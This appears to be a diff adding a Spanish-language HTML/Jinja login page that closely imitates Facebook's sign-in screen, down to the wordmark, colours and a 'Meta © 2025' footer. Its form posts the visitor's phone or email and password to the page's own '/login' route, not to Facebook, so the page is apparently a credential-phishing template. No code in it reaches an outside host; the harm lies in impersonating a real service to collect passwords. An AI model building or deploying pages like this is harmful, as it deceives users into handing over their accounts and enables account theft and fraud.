@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Iniciar sesión con facebook</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            height: 100vh;
+            margin: 0;
+            padding: 5px;
+        }
+        .descripcion {
+        font-size: 3px; /* Ajusta el tamaño según lo necesites */
+        color: gray; /* Cambia el color a gris o cualquier otro */
+        text-align: center;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            max-width: 100%;
+            width: 100%;
+            margin-top: 10px;
+        }
+        .login-box {
+            background: white;
+            padding: 50px;
+            border-radius: 25px;
+            box-shadow: 0 0 25px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 300px;
+            text-align: center; 
+        }
+        .login-box h2 {
+            margin-bottom: 20px;
+            font-size: 20px;
+        }
+        .input-container {
+        position: relative;
+        width: 100%;
+        }
+
+        input {
+            width: 90%;
+            padding: 10px;  /* tamaño de cuadros*/
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 14px;
+            padding-right: 30px; /* Espacio para el icono */
+
+        }
+        .toggle-password {
+        position: absolute;
+        right: 5px;
+        top: 50%;
+        transform: translateY(-50%);
+        cursor: pointer;
+        width: 16px;
+        height: 16px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        }
+        button {
+            width: 100%;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        .btn-login {
+            background-color: #1877f2;
+            font-weight: bold;
+        }
+        .btn-login:hover {
+            background-color: #166fe5;
+        }
+        .btn-register {
+            background-color: #42b72a;
+            margin-top: 20px;
+            font-weight: bold;
+            width: 100%;
+            font-size: 14px;
+        }
+        .btn-register:hover {
+            background-color: #36a420;
+        }
+        .forgot-password {
+            display: block;
+            margin: 10px 0;
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 12px;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        .create-page-container {
+            width: 100%;
+            max-width: 300px;
+            margin-top: 20px;
+            text-align: center;
+        }
+        .create-page {
+            font-size: 12px;
+            color: #060606;
+        }
+        h1 {
+            font-size: 60px;
+            text-align: center;
+            margin-bottom: 5px;
+        }
+        .descripcion {
+            font-size: 10px;
+            text-align: center;
+            max-width: 95%;
+            margin-bottom: 15px;
+        }
+        .watermark {
+        font-size: 8px; /* Tamaño del texto */
+        color: gray; /* Color del texto */
+        position: absolute;
+        bottom: 18px; /* Distancia desde el fondo */
+        left: 50%;
+        transform: translateX(-50%); /* Centrar el texto */
+        }
+
+    </style>
+</head>
+<body>
+    <div class="container">
+        <p class="descripcion">Español</p>
+        <h1 style="color: #1877f2;">facebook</h1>
+
+        <div class="login-box">
+            {% if mensaje %}
+                <p style="color: red; font-size: 26px;">{{ mensaje }}</p>
+            {% endif %}
+            <form action="/login" method="POST">
+                <input type="text" name="usuario" placeholder="Celular o correo electrónico" required>
+                <div class="input-container">
+                    <input type="password" name="contraseña" id="password" placeholder="Contraseña" required value="{{ contraseña if contraseña else '' }}">
+                    <span class="toggle-password" onclick="togglePassword()">
+                        <svg id="eye-open" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="24" height="24">
+                            <path d="M12 15a3 3 0 100-6 3 3 0 000 6z" />
+                            <path fill-rule="evenodd" d="M1.323 11.447C2.811 6.976 7.028 3.75 12.001 3.75c4.97 0 9.185 3.223 10.675 7.69.12.362.12.752 0 1.113-1.487 4.471-5.705 7.697-10.677 7.697-4.97 0-9.186-3.223-10.675-7.69a1.762 1.762 0 010-1.113zM17.25 12a5.25 5.25 0 11-10.5 0 5.25 5.25 0 0110.5 0z" clip-rule="evenodd" />
+                        </svg>
+                        <svg id="eye-closed" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="24" height="24" style="display: none;">
+                            <path d="M3 12c3.866-5.333 7.732-8 11.598-8 3.866 0 7.732 2.667 11.598 8-3.866 5.333-7.732 8-11.598 8-3.866 0-7.732-2.667-11.598-8zM12 15a3 3 0 100-6 3 3 0 000 6z" />
+                            <path d="M2 2l20 20" stroke="currentColor" stroke-width="2" stroke-linecap="round" />
+                        </svg>
+                    </span>
+                    
+                </div>
+                
+                <button type="submit" class="btn-login">Iniciar Sesión</button>
+                <a href="/recuperar" class="forgot-password">¿Olvidaste tu contraseña?</a>
+                <button class="btn-register">Crear nueva cuenta</button>
+            </form>
+        </div>
+        <div class="create-page-container">
+            <p class="create-page">
+                <a href="/crear-pagina" style="font-weight: bold; text-decoration: none; color: #060606; font-size: 10px;">Crear una página</a> 
+                para una celebridad, una marca o un negocio.
+            </p>
+            <p class="watermark">Meta © 2025. Todos los derechos reservados.</p>
+
+        </div>
+    </div>
+    <script>
+        function togglePassword() {
+            var passwordField = document.getElementById("password");
+            var eyeOpen = document.getElementById("eye-open");
+            var eyeClosed = document.getElementById("eye-closed");
+
+            if (passwordField.type === "password") {
+                passwordField.type = "text";
+                eyeOpen.style.display = "none";
+                eyeClosed.style.display = "inline";
+            } else {
+                passwordField.type = "password";
+                eyeOpen.style.display = "inline";
+                eyeClosed.style.display = "none";
+            }
+        }
+
+    </script>
+</body>
+</html>
